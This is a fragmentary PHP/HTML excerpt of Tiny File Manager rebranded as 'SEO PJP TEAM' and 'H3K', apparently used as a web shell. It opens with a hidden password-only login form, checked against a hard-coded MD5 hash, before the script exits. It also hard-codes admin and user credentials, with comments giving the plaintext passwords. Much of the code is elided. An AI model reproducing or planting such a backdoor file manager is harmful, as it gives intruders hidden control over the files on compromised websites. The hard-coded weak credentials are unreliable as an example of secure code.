...
$password = "dd189639fd170c10688999bc9404b2b7"; 
...
<pre align=right><form method=post><br><input type=password name=pass></form></pre> 
</body>
</html>
<?php
    exit;
...
$auth_users = array(
    'admin' => '$2y$10$VCDT6lMKfeR2xJE9S8kK4.rTOc3hD5z85qBv/mwhDDpIH6ig/17fq', //admin@123
    'user' => '$2y$10$VCDT6lMKfeR2xJE9S8kK4.rTOc3hD5z85qBv/mwhDDpIH6ig/17fq' //12345
);
                        ...
                        <div class="card fat <?php echo fm_get_theme(); ?>">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div class="mb-3">
                                       <div class="brand">
                                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" M1008 width="100%" height="80px" viewBox="0 0 238.000000 140.000000" aria-label="H3K SEO PJP TEAM">
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="https://github.com/prasathmani/tinyfilemanager" target="_blank" class="app-v-title"> SEO PJP TEAM <?php echo VERSION; ?></a></h3></p>
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">SEO PJP TEAM </a></div>
        <?php else: ?>
            <div class="col-12"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">SEO PJP TEAM </a></div>
        <?php endif; ?>
    </div>
</form>
...
function lng($txt) {
    ...
    // English Language
    $tr['en']['AppName']        = 'Tiny File Manager';      $tr['en']['AppTitle']           = 'SEO PJP TEAM';
